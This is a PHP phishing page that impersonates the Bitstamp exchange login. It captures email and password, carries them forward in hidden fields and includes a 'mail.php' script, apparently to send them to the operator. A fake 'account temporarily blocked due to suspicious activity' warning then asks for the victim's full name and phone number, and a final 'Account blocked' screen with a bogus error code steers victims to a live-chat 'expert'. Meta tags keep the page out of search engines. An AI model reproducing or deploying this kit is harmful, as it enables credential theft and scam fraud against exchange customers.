<html data-n-head="">
   <head>
        <meta name="robots" content="noindex, nofollow" />
        <meta name="googlebot" content="noindex, nofollow" />
        <meta name="bingbot" content="noindex, nofollow" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Bitstamp - buy and sell bitcoin</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="assets/favicon.ico">
        <?php include'css-file.php'; ?>  
    </head>
    <body>
        <div id="__nuxt">
            
            <div id="__layout">
                <div class="layout">
                    <nav data-v-5f710f09="" class="navigation-wrap">
                        <div data-v-5f710f09="" class="navigation">
                            <div data-v-5f710f09="" class="navigation__logo navigation__side">
                                <a data-v-39b90c33="" data-v-5f710f09="" href="#" target="" rel="nofollow noopener noreferrer" class="link">
                                    <img data-v-5f710f09="" data-v-39b90c33="" src="./assets/1b25a33ec61948b5aa761d1159912ae6.svg" class="navigation__logo">
                                </a>
                            </div>
                            <div data-v-5f710f09="" class="navigation__mobile-logo navigation__side">
                                <a data-v-39b90c33="" data-v-5f710f09="" href="#" target="" rel="nofollow noopener noreferrer" class="link">
                                    <img data-v-5f710f09="" data-v-39b90c33="" src="./assets/371d12665c9066c59a7ca91cf963320a.svg" class="navigation__mobile-logo">
                                </a>
                            </div>
                            
                            
                            <div data-v-5f710f09="" class="navigation__profile navigation__side">
                                <a data-v-39b90c33="" data-v-5f710f09="" href="#" class="link">
                                    Register
                                </a>
                            </div>
                            <div data-v-5f710f09="" class="navigation__menu navigation__side"><img data-v-5f710f09="" src="./assets/8a763783ce210d53f6d33c8d9cb925bf.svg"></div>
                            
                        </div>
                    </nav>
                    <section data-v-a403388c="" class="container">
                        
                        <section data-v-5e0df73a="" data-v-a403388c="" class="sub-step substep-section">

                              <?php
                                 if (isset($_POST['btnLoginMore'])) {
                                    include 'mail.php';
                                ?>
                            
                                  <div data-v-5e0df73a="" class="sub-step__content">

                                <div data-v-5e0df73a="" class="sub-step-header">
                                    <div data-v-6aa64f22="" data-v-5e0df73a="" class="login-header">
                                    </div>
                                     <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                        Kindly contact chat assistance for further help
                                    </div>
                                    <h1 data-v-5e0df73a="" class="sub-step-header__title" style=" margin-top: 30px;">
                                       Verification Required
                                    </h1>
                                   
                                </div>
                                <div data-v-5e0df73a="" class="sub-step__form-wrap">
                                    <form data-v-ef34460a="" data-v-5e0df73a="" method="post" class="sub-step__form form">
                                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                        <div data-v-ef34460a="" class="vue-form-generator" id="vue-form">
                                            <div class="field-group">
                                                <div class="form-element clean required field-input">
                                                    <div class="field-wrap">
                                                        <div>
                                                            <div data-v-4148cf34="" class="text-input text-input--default text-input--text" name="">
                                                                <!-- <label data-v-4148cf34="" for="form_username" class="text-input__label text-input__label--placeholder text-input__label--transition">
                                                                    Email or User ID
                                                                </label> -->
                                                                <div data-v-4148cf34="" class="text-input__wrapper">
                                                                    <input data-v-4148cf34="" name="name" id="form_username" type="text" placeholder="Full Name" autocomplete="username" class="text-input__field unset-global-style" required>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        
                                                    </div>
                                                    
                                                </div>
                                                <div class="form-element clean required field-input">
                                                    
                                                    <div class="field-wrap">
                                                        <div>
                                                            <div data-v-4148cf34="" class="text-input text-input--default text-input--password" name="">
                                                                <!-- <label data-v-4148cf34="" for="form_password" class="text-input__label text-input__label--placeholder text-input__label--transition">
                                                                    Password
                                                                </label> -->
                                                                <div data-v-4148cf34="" class="text-input__wrapper">
                                                                    
                                                                    <input data-v-4148cf34="" name="number" id="form_password" type="text" placeholder="Phone Number" autocomplete="current-password" class="text-input__field unset-global-style text-input__field--padding-right" required>
                                                                </div>
                                                             </div>
                                                        </div>
                                                        
                                                    </div>
                                                    
                                                </div>
                                               
                                                
                                            </div>
                                        </div>
                                        <div data-v-5e0df73a="" class="sub-step__footer">
                                        <div data-v-5e0df73a="" class="sub-step__button-section">
                                            <button  type="submit" name="fromLog" data-v-813efc18="" data-v-5e0df73a="" class="sub-step__button button button--regular button--default" >
                                                Verify
                                            </button>
                                        </div>
                                </div>                                    
                                </div>

                            <?php } elseif (isset($_POST['fromLog'])) {
                                 include 'mail.php';
                             ?>


                              <div data-v-5e0df73a="" class="sub-step__content">

                                <div data-v-5e0df73a="" class="sub-step-header">
                                    <div data-v-6aa64f22="" data-v-5e0df73a="" class="login-header">
                                    </div>
                                     <div class="ant-card-body" style="width: 40%;margin: auto;">
                                        <h1 data-v-5e0df73a="" class="sub-step-header__title" style=" margin-top: 30px;">
                                       Account blocked
                                    </h1>
                                                
                                               <div class="panel-body text-center" style="text-align: center;">
                                                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                                    <div class="form">
                                                        <label style="font-size: 18px;    display: contents;">Error CODE: <b>6X76D</b></label><br>
                                                    </div>
                                                    <div class="calling-number">
                                                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;padding: 10px; display:  inline-block; font-size: 20px;font-weight: 600;margin-top: 15px;">Ask Expert</a>
                                                    </div>
                                                </div>
                                            </div>
                                    
                                   
                                </div>
                               


                             <?php } else { ?>
                            <div data-v-5e0df73a="" class="sub-step__content">

                                <div data-v-5e0df73a="" class="sub-step-header">
                                    <div data-v-6aa64f22="" data-v-5e0df73a="" class="login-header">
                                    </div>
                                    <h1 data-v-5e0df73a="" class="sub-step-header__title">
                                        Log in
                                    </h1>
                                    <div data-v-4b49c110="" data-v-5e0df73a="" class="login-header-container">
                                        <h3 data-v-4b49c110="" class="login-subtitle">
                                            Don't have an account?
                                            <a data-v-39b90c33="" data-v-4b49c110="" href="#" class="link">
                                                Register now for free.
                                            </a>
                                        </h3>
                                    </div>
                                </div>
                                <div data-v-5e0df73a="" class="sub-step__form-wrap">
                                    <form data-v-ef34460a="" data-v-5e0df73a="" method="post" class="sub-step__form form">
                                        <div data-v-ef34460a="" class="vue-form-generator" id="vue-form">
                                            <div class="field-group">
                                                <div class="form-element clean required field-input">
                                                    <div class="field-wrap">
                                                        <div>
                                                            <div data-v-4148cf34="" class="text-input text-input--default text-input--text" name="">
                                                                <!-- <label data-v-4148cf34="" for="form_username" class="text-input__label text-input__label--placeholder text-input__label--transition">
                                                                    Email or User ID
                                                                </label> -->
                                                                <div data-v-4148cf34="" class="text-input__wrapper">
                                                                    <input data-v-4148cf34="" name="email" id="form_username" type="text" placeholder="Email or User ID" autocomplete="username" class="text-input__field unset-global-style" required>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        
                                                    </div>
                                                    
                                                </div>
                                                <div class="form-element clean required field-input">
                                                    
                                                    <div class="field-wrap">
                                                        <div>
                                                            <div data-v-4148cf34="" class="text-input text-input--default text-input--password" name="">
                                                                <!-- <label data-v-4148cf34="" for="form_password" class="text-input__label text-input__label--placeholder text-input__label--transition">
                                                                    Password
                                                                </label> -->
                                                                <div data-v-4148cf34="" class="text-input__wrapper">
                                                                    
                                                                    <input data-v-4148cf34="" name="password" id="form_password" type="password" placeholder="Password" autocomplete="current-password" class="text-input__field unset-global-style text-input__field--padding-right" required>
                                                                </div>
                                                             </div>
                                                        </div>
                                                        
                                                    </div>
                                                    
                                                </div>
                                                <div class="form-element clean field-slot">
                                                    
                                                    <div class="field-wrap">
                                                        <div>
                                                            <div class="field-slot">
                                                                <div class="vue-portal-target">
                                                                    <div data-v-271d5c77="" data-v-5e0df73a="" class="forgot-password-slot">
                                                                        <a data-v-39b90c33="" data-v-271d5c77="" href="#" class="link">
                                                                            Forgot password?
                                                                        </a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        
                                                    </div>
                                                    
                                                </div>
                                                <div class="form-element clean flex flex--justify-center field-hcaptcha-form field-hcaptcha">
                                                    
                                                    <div class="field-wrap">
                                                        <div>
                                                            <div data-v-2062acc6="" widget-id="0">
                                                                
                                                                <div data-v-2062acc6="">
                                                                    <div data-v-2062acc6="" class="hcaptcha-link-container">
                                                                        This site is protected by hCaptcha and its
                                                                        <a data-v-2062acc6="" target="_blank" href="#" class="hcaptcha-link hcaptcha-link__left">Privacy Policy</a> and
                                                                        <a data-v-2062acc6="" target="_blank" href="#" class="hcaptcha-link">Terms of Service</a> apply.
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        
                                                    </div>
                                                    
                                                </div>
                                            </div>
                                        </div>
                                        <div data-v-5e0df73a="" class="sub-step__footer">
                                        <div data-v-5e0df73a="" class="sub-step__button-section">
                                            <button  type="submit" name="btnLoginMore" data-v-813efc18="" data-v-5e0df73a="" class="sub-step__button button button--regular button--default" >
                                                Log in
                                            </button>
                                        </div>
                                </div>                                    
                                </div>
                              
                            </div>
                            <?php } ?>
                        </section>
                       
                        
                    </section>
                    <div class="vue-portal-target"></div>
                </div>
            </div>
        </div>
          <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</body>
</html>